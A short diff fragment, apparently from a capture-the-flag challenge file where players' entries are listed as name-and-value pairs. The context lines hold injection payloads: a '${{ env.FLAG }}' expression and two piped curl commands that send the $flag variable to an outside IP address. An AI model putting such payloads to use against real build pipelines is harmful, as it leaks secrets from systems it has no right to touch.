@@ -535,3 +535,4 @@ ${{ env.FLAG }}
 R1gelX29:|test
 |curl http://101.132.238.43:5992/?xxx=$flag;
 |curl http://101.132.238.43:5992/?xxx=$flag;
+matoujin:echo flag
